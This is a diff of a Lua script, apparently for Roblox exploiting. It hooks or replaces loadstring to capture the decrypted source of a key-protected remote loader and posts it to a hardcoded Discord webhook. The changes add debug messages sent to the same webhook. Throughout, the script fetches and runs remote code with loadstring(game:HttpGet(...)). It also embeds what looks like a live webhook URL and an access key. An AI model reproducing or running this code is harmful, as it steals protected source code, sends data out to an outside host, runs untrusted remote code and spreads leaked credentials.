@@ -1,5 +1,5 @@
 --[[
-  Capture source and send to Discord webhook only (no files, no clipboard).
+  Capture source → Discord webhook only. Debug messages sent to same webhook.
 ]]
 
 local _K = "XEBGtoEqCvrdDyGxWPpcKrHYKGxvrijf"
@@ -8,6 +8,21 @@ local _W = "https://discord.com/api/webhooks/1479152924402647231/rtgjUt8LjlCdNjh
 
 local _n = 0
 local _maxChunk = 3900
+
+local function _post(content)
+	pcall(function()
+		if game and game.GetService then
+			game:GetService("HttpService"):PostAsync(_W, game:GetService("HttpService"):JSONEncode({ content = tostring(content) }))
+		elseif type(request) == "function" then
+			local q = ("%q"):format(tostring(content):gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r"))
+			request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = "{\"content\":" .. q .. "}" })
+		end
+	end)
+end
+
+local function _debug(msg)
+	_post("[DEBUG] " .. tostring(msg))
+end
 
 local function _send(s)
 	if type(s) ~= "string" or #s < 600 then return end
@@ -35,28 +50,44 @@ local function _send(s)
 	end)
 end
 
+_debug("Script started")
+
 local _real = loadstring
 local _d = debug
-if _d and _d.sethook and _d.getinfo and _d.getlocal then
-	local _done
+local _useHook = _d and _d.sethook and _d.getinfo and _d.getlocal
+
+if _useHook then
+	_debug("Using debug hook (will remove after first loadstring so it doesn't freeze)")
+	-- Only hook for the FIRST loadstring call (the loader). Then remove hook and use wrapper so we don't freeze.
+	local _hookActive = true
 	_d.sethook(function(ev)
-		if ev ~= "call" or _done then return end
+		if ev ~= "call" or not _hookActive then return end
 		local info = _d.getinfo(2, "f")
 		if not info or not info.func then return end
 		if info.func ~= _real then return end
 		local _, src = _d.getlocal(2, 1)
-		if type(src) == "string" and #src >= 600 then
-			_send(src)
-			_done = true
-			_d.sethook()
+		_debug("loadstring called, len=" .. (type(src) == "string" and #src or 0) .. " – removing hook, using wrapper")
+		_hookActive = false
+		_d.sethook()
+		-- From now on use wrapper so next loadstring (decrypted) gets captured
+		loadstring = function(src2, name)
+			if type(src2) == "string" then _send(src2) end
+			return _real(src2, name)
 		end
 	end, "c")
 else
+	_debug("Using loadstring wrapper (debug.sethook not available)")
 	loadstring = function(src, name)
 		if type(src) == "string" then _send(src) end
 		return _real(src, name)
 	end
 end
 
-script_key = _K
-loadstring(game:HttpGet(_U))()
+_debug("Calling loader: GetHttp + loadstring...")
+local ok, err = pcall(function()
+	script_key = _K
+	loadstring(game:HttpGet(_U))()
+end)
+if not ok then
+	_debug("ERROR: " .. tostring(err))
+end
